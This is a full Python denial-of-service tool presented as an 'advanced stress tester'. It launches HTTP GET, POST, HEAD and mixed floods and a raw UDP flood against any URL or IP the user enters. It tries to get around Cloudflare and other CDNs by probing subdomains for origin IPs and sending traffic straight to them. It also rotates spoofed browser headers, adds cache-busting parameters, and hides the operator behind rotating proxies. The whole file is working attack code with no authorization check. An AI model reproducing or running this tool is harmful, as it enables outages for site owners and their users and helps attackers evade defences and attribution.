#!/usr/bin/env python3
"""
Advanced Network Stress Testing Tool V3.0
Enhanced with Cloudflare bypass, origin targeting, and advanced features
"""

import socket
import random
import time
import threading
import requests
import urllib3
import json
import hashlib
import ssl
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Config:
    proxies = []
    proxy_index = 0
    proxy_lock = threading.Lock()
    bad_proxies = set()
    working_proxies = set()
    debug = False
    
    stats = {
        'total_requests': 0,
        'successful': 0,
        'failed': 0,
        'bytes_sent': 0,
        'bytes_received': 0,
        'status_codes': {},
        'start_time': None
    }
    stats_lock = threading.Lock()

config = Config()

BANNER = """
╔══════════════════════════════════════════════════════════╗
║        ADVANCED STRESS TESTER V3.0 - ELITE EDITION      ║
║              Enhanced CF Bypass + Origin Targeting       ║
╚══════════════════════════════════════════════════════════╝
"""

BROWSER_PROFILES = [
    {
        'name': 'Chrome Windows',
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec_ch_ua_platform': '"Windows"',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    },
    {
        'name': 'Firefox Windows',
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    },
    {
        'name': 'Safari Mac',
        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    },
    {
        'name': 'Edge Windows',
        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        'sec_ch_ua_platform': '"Windows"',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    }
]

def test_proxy(proxy_url, timeout=2):
    """Test if a proxy is working"""
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        response = session.get('http://1.1.1.1', timeout=timeout)
        return response.status_code in [200, 201, 204, 301, 302, 303, 307, 308, 400, 401, 403, 404, 429]
    except:
        return False

def load_proxies(file_path='proxies.txt'):
    """Load and validate proxies from file"""
    try:
        with open(file_path, 'r') as f:
            raw = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
        if not raw:
            print("[!] No proxies found in proxies.txt")
            print("[!] Format: ip:port (one per line)")
            print("[!] Example: 123.45.67.89:8080")
            return False
            
        print(f"[*] Loading {len(raw)} proxies...")
        print("[!] IMPORTANT: Proxies MUST be working HTTP/HTTPS proxies")
        print("[!] Format: ip:port or http://ip:port (one per line)")
        
        temp_proxies = []
        for proxy in raw:
            if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                proxy = f'http://{proxy}'
            temp_proxies.append(proxy)
        
        print("[*] Testing proxies for working connections (this is REQUIRED)...")
        print("[*] Using 200 parallel threads for fast validation...")
        from concurrent.futures import ThreadPoolExecutor
        
        tested = 0
        valid_count = 0
        
        with ThreadPoolExecutor(max_workers=200) as executor:
            for proxy, is_valid in executor.map(lambda p: (p, test_proxy(p, timeout=2)), temp_proxies):
                tested += 1
                if is_valid:
                    config.proxies.append(proxy)
                    valid_count += 1
                if tested % 50 == 0 or tested == len(temp_proxies):
                    print(f"[*] Progress: {tested}/{len(temp_proxies)} tested | {valid_count} working")
        
        if len(config.proxies) == 0:
            print("[!] NO WORKING PROXIES FOUND!")
            print("[!] Your real IP WILL be exposed if you continue")
            print("[!] Get working proxies from: free-proxy-list.net or similar")
            return False
            
        print(f"[+] Loaded {len(config.proxies)} WORKING proxies (removed {len(temp_proxies) - len(config.proxies)} dead)")
        print(f"[+] Your real IP will be HIDDEN behind these proxies")
        
        return len(config.proxies) > 0
    except FileNotFoundError:
        print("[!] proxies.txt not found!")
        print("[!] Create a file named 'proxies.txt' in the same folder as this script")
        print("[!] Format: ip:port (one per line)")
        print("[!] Example:")
        print("    123.45.67.89:8080")
        print("    98.76.54.32:3128")
        return False

def get_proxy():
    """Get next proxy with rotation, skipping bad ones"""
    if not config.proxies:
        return None
    
    with config.proxy_lock:
        attempts = 0
        max_attempts = len(config.proxies)
        
        while attempts < max_attempts:
            proxy = config.proxies[config.proxy_index % len(config.proxies)]
            config.proxy_index += 1
            
            if proxy not in config.bad_proxies:
                return {'http': proxy, 'https': proxy}
            
            attempts += 1
        
        return None

def mark_proxy_bad(proxy_dict):
    """Mark a proxy as bad"""
    if proxy_dict:
        with config.proxy_lock:
            config.bad_proxies.add(proxy_dict.get('http', ''))

def get_advanced_headers(url, referer=None, profile=None):
    """Generate advanced browser-like headers with anti-fingerprinting"""
    if not profile:
        profile = random.choice(BROWSER_PROFILES)
    
    headers = {
        'User-Agent': profile['ua'],
        'Accept': profile.get('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-US,en;q=0.5']),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1',
        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
        'Pragma': 'no-cache',
    }
    
    if 'sec_ch_ua' in profile:
        headers['sec-ch-ua'] = profile['sec_ch_ua']
        headers['sec-ch-ua-mobile'] = '?0'
        headers['sec-ch-ua-platform'] = profile['sec_ch_ua_platform']
    
    if referer:
        headers['Referer'] = referer
    
    if random.random() > 0.5:
        headers['X-Requested-With'] = 'XMLHttpRequest'
    
    return headers

def discover_origin_ips(domain):
    """Advanced origin IP discovery with multiple techniques"""
    print(f"[*] Discovering origin IPs for {domain}...")
    found_ips = set()
    
    subdomains = [
        'direct', 'origin', 'direct-connect', 'direct-origin',
        'dev', 'staging', 'test', 'beta', 'alpha',
        'admin', 'panel', 'cpanel', 'whm', 'webmail',
        'mail', 'smtp', 'ftp', 'ssh', 'vpn',
        'db', 'database', 'mysql', 'backup',
        'old', 'legacy', 'v1', 'v2', 'api', 'api2'
    ]
    
    print(f"[*] Scanning {len(subdomains)} subdomains...")
    for sub in subdomains:
        try:
            test_domain = f"{sub}.{domain}"
            ip = socket.gethostbyname(test_domain)
            
            if not ip.startswith((
                '104.', '172.', '162.', '2606:', '2803:', '2405:', '2a06:',
                '13.', '34.', '35.', '54.', '52.',
                '23.', '95.', '96.',
                '151.', '2a02:',
            )):
                found_ips.add(ip)
                print(f"  [+] Found: {test_domain} -> {ip}")
        except:
            pass
    
    try:
        main_ip = socket.gethostbyname(domain)
        found_ips.add(main_ip)
    except:
        pass
    
    if found_ips:
        print(f"[+] Discovered {len(found_ips)} potential origin IPs")
        return list(found_ips)
    else:
        print("[!] No origin IPs found, using domain directly")
        return [domain]

def validate_url(url):
    """Validate and fix URL format"""
    url = url.strip()
    
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
        print(f"[*] Added HTTPS protocol: {url}")
    
    try:
        parsed = urlparse(url)
        if not parsed.hostname:
            raise ValueError("Invalid URL format")
        return url
    except Exception as e:
        raise ValueError(f"Invalid URL: {e}")

def add_cache_buster(url):
    """Add cache-busting parameters"""
    separator = '&' if '?' in url else '?'
    params = [
        f"_={int(time.time() * 1000)}",
        f"rand={random.randint(100000, 999999)}",
        f"nocache={hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
    ]
    return url + separator + random.choice(params)

def update_stats(success=False, status_code=None, bytes_sent=0, bytes_received=0):
    """Update global statistics"""
    with config.stats_lock:
        config.stats['total_requests'] += 1
        if success:
            config.stats['successful'] += 1
        else:
            config.stats['failed'] += 1
        config.stats['bytes_sent'] += bytes_sent
        config.stats['bytes_received'] += bytes_received
        
        if status_code:
            config.stats['status_codes'][status_code] = config.stats['status_codes'].get(status_code, 0) + 1

def display_stats():
    """Display formatted statistics"""
    elapsed = time.time() - config.stats['start_time']
    req_rate = config.stats['total_requests'] / elapsed if elapsed > 0 else 0
    success_rate = (config.stats['successful'] / config.stats['total_requests'] * 100) if config.stats['total_requests'] > 0 else 0
    
    print(f"\n{'='*70}")
    print(f"[STATS] Time: {elapsed:.1f}s | Requests: {config.stats['total_requests']} | Rate: {req_rate:.1f} req/s")
    print(f"[STATS] Success: {config.stats['successful']} ({success_rate:.1f}%) | Failed: {config.stats['failed']}")
    print(f"[STATS] Sent: {config.stats['bytes_sent']/1024:.1f} KB | Received: {config.stats['bytes_received']/1024:.1f} KB")
    
    if config.stats['status_codes']:
        codes = ', '.join([f"{k}:{v}" for k, v in sorted(config.stats['status_codes'].items())])
        print(f"[STATS] Status Codes: {codes}")
    
    if config.proxies and config.working_proxies:
        working_count = len(config.working_proxies)
        working_ips = ', '.join(sorted(list(config.working_proxies))[:10])
        if len(config.working_proxies) > 10:
            working_ips += f" ... (+{len(config.working_proxies) - 10} more)"
        print(f"[STATS] Working Proxies: {working_count} | IPs: {working_ips}")
    
    print(f"{'='*70}")

class HTTPFlood:
    """Advanced HTTP Flood with CF bypass"""
    
    def __init__(self, url, duration, threads=50, method='GET', use_origin=True):
        self.url = url
        self.duration = duration
        self.threads = threads
        self.method = method
        self.use_origin = use_origin
        self.running = False
        self.parsed_url = urlparse(url)
        self.domain = self.parsed_url.hostname
        self.origin_ips = []
        
    def prepare(self):
        """Prepare attack - discover origins, validate proxies"""
        print(f"\n[*] Preparing {self.method} flood attack...")
        print(f"[*] Target: {self.url}")
        print(f"[*] Duration: {self.duration}s")
        print(f"[*] Threads: {self.threads}")
        
        if self.use_origin and self.domain:
            self.origin_ips = discover_origin_ips(self.domain)
        
        if config.proxies:
            print(f"[*] Loaded {len(config.proxies)} proxies for rotation across all threads")
            self.use_proxy_rotation = True
            config.working_proxies.clear()
        else:
            self.use_proxy_rotation = False
        
        config.stats['start_time'] = time.time()
        self.running = True
        
    def worker(self, thread_id=0):
        """Worker thread for sending requests"""
        session = requests.Session()
        session.verify = False
        
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=300,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        import warnings
        warnings.filterwarnings('ignore', message='Unverified HTTPS request')
        
        current_proxy_index = thread_id % len(config.proxies) if config.proxies else 0
        current_proxy_ip = None
        if self.use_proxy_rotation:
            proxy = config.proxies[current_proxy_index]
            current_proxy_ip = proxy.replace('http://', '').replace('https://', '').split(':')[0]
            session.proxies = {'http': proxy, 'https': proxy}
        
        end_time = time.time() + self.duration
        local_count = 0
        consecutive_fails = 0
        
        while self.running and time.time() < end_time:
            try:
                profile = random.choice(BROWSER_PROFILES)
                headers = get_advanced_headers(self.url, referer=self.url, profile=profile)
                
                target_url = self.url
                if self.origin_ips and self.use_origin:
                    origin_ip = random.choice(self.origin_ips)
                    if origin_ip != self.domain:
                        target_url = self.url.replace('https://', 'http://').replace(self.domain, origin_ip)
                        headers['Host'] = self.domain
                    else:
                        target_url = self.url
                
                target_url = add_cache_buster(target_url)
                
                timeout = 1.5
                
                if self.method == 'GET':
                    response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
                elif self.method == 'POST':
                    data = {'data': 'x' * random.randint(100, 1000)}
                    response = session.post(target_url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
                elif self.method == 'HEAD':
                    response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=False)
                
                update_stats(
                    success=True,
                    status_code=response.status_code,
                    bytes_sent=len(response.request.body or b'') + sum(len(k) + len(v) for k, v in headers.items()),
                    bytes_received=len(response.content)
                )
                
                if current_proxy_ip and local_count % 10 == 0:
                    with config.stats_lock:
                        config.working_proxies.add(current_proxy_ip)
                
                consecutive_fails = 0
                local_count += 1
                
                if config.debug and local_count % 100 == 0:
                    print(f"[DEBUG] Thread-{thread_id}: {local_count} requests | Status: {response.status_code}")
                
            except (requests.exceptions.SSLError,
                    requests.exceptions.ProxyError,
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.ReadTimeout) as e:
                update_stats(success=False)
                consecutive_fails += 1
                
                if consecutive_fails >= 2 and self.use_proxy_rotation:
                    try:
                        current_proxy_index = (current_proxy_index + 1) % len(config.proxies)
                        proxy = config.proxies[current_proxy_index]
                        current_proxy_ip = proxy.replace('http://', '').replace('https://', '').split(':')[0]
                        session.proxies = {'http': proxy, 'https': proxy}
                        consecutive_fails = 0
                    except:
                        pass
                
            except Exception as e:
                update_stats(success=False)
        
        try:
            session.close()
        except:
            pass
    
    def start(self):
        """Start the attack"""
        self.prepare()
        
        print(f"[*] Starting attack with {self.threads} threads...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.worker, i) for i in range(self.threads)]
            
            last_stats = time.time()
            while self.running and time.time() < config.stats['start_time'] + self.duration:
                time.sleep(1)
                if time.time() - last_stats >= 5:
                    display_stats()
                    last_stats = time.time()
            
            self.running = False
            
            for future in as_completed(futures, timeout=10):
                pass
        
        display_stats()
        print("\n[+] Attack completed!")

class UDPFlood:
    """Advanced UDP Flood"""
    
    def __init__(self, ip, port, duration, packet_size=1024, threads=50):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.packet_size = packet_size
        self.threads = threads
        self.running = False
        self.total_packets = 0
        self.lock = threading.Lock()
        
    def worker(self):
        """Worker thread for UDP flooding"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        end_time = time.time() + self.duration
        local_count = 0
        
        while self.running and time.time() < end_time:
            try:
                payload = random.randbytes(self.packet_size)
                sock.sendto(payload, (self.ip, self.port))
                
                with self.lock:
                    self.total_packets += 1
                local_count += 1
                
                if config.debug and local_count % 1000 == 0:
                    print(f"[DEBUG] Thread sent {local_count} packets")
                    
            except Exception as e:
                if config.debug:
                    print(f"[DEBUG] Error: {e}")
        
        sock.close()
    
    def start(self):
        """Start UDP flood"""
        print(f"\n[*] Starting UDP Flood")
        print(f"[*] Target: {self.ip}:{self.port}")
        print(f"[*] Duration: {self.duration}s | Packet Size: {self.packet_size} bytes")
        print(f"[*] Threads: {self.threads}")
        
        self.running = True
        start_time = time.time()
        
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        
        last_stats = time.time()
        while self.running and time.time() < start_time + self.duration:
            time.sleep(1)
            if time.time() - last_stats >= 5:
                elapsed = time.time() - start_time
                rate = self.total_packets / elapsed if elapsed > 0 else 0
                bandwidth = (self.total_packets * self.packet_size) / (1024 * 1024) / elapsed
                print(f"\n[STATS] Packets: {self.total_packets} | Rate: {rate:.0f} pkt/s | Bandwidth: {bandwidth:.2f} MB/s")
                last_stats = time.time()
        
        self.running = False
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_time
        rate = self.total_packets / elapsed if elapsed > 0 else 0
        bandwidth = (self.total_packets * self.packet_size) / (1024 * 1024) / elapsed
        print(f"\n[+] UDP Flood completed!")
        print(f"[+] Total packets: {self.total_packets} | Rate: {rate:.0f} pkt/s | Bandwidth: {bandwidth:.2f} MB/s")

def main():
    global config
    
    print(BANNER)
    
    debug_input = input("[?] Enable debug mode? (y/n): ").strip().lower()
    config.debug = (debug_input == 'y')
    
    proxy_input = input("[?] Use proxies? (y/n): ").strip().lower()
    if proxy_input == 'y':
        load_proxies()
    
    print("\n[SELECT ATTACK TYPE]")
    print("  1. HTTP GET Flood (Advanced)")
    print("  2. HTTP POST Flood (Advanced)")
    print("  3. HTTP HEAD Flood")
    print("  4. UDP Flood (Raw)")
    print("  5. Mixed HTTP Flood (GET+POST)")
    
    choice = input("\n[>] Select attack (1-5): ").strip()
    
    if choice in ['1', '2', '3', '5']:
        url = input("[>] Enter target URL (e.g., example.com or https://example.com): ").strip()
        
        try:
            url = validate_url(url)
        except ValueError as e:
            print(f"[!] {e}")
            return
        
        duration = int(input("[>] Duration (seconds): "))
        threads = int(input("[>] Number of threads (10-200): "))
        
        bypass_cf = input("[?] Attempt Cloudflare/CDN bypass? (y/n): ").strip().lower()
        use_origin = (bypass_cf == 'y')
        
        if choice == '1':
            attack = HTTPFlood(url, duration, threads, method='GET', use_origin=use_origin)
            attack.start()
        elif choice == '2':
            attack = HTTPFlood(url, duration, threads, method='POST', use_origin=use_origin)
            attack.start()
        elif choice == '3':
            attack = HTTPFlood(url, duration, threads, method='HEAD', use_origin=use_origin)
            attack.start()
        elif choice == '5':
            print("[*] Running mixed GET+POST attack...")
            get_threads = threads // 2
            post_threads = threads - get_threads
            
            get_attack = HTTPFlood(url, duration, get_threads, method='GET', use_origin=use_origin)
            post_attack = HTTPFlood(url, duration, post_threads, method='POST', use_origin=use_origin)
            
            t1 = threading.Thread(target=get_attack.start)
            t2 = threading.Thread(target=post_attack.start)
            
            t1.start()
            t2.start()
            t1.join()
            t2.join()
    
    elif choice == '4':
        ip = input("[>] Enter target IP: ").strip()
        port = int(input("[>] Enter target port: "))
        duration = int(input("[>] Duration (seconds): "))
        packet_size = int(input("[>] Packet size (bytes, 64-65000): "))
        threads = int(input("[>] Number of threads (10-200): "))
        
        attack = UDPFlood(ip, port, duration, packet_size, threads)
        attack.start()
    
    else:
        print("[!] Invalid choice!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
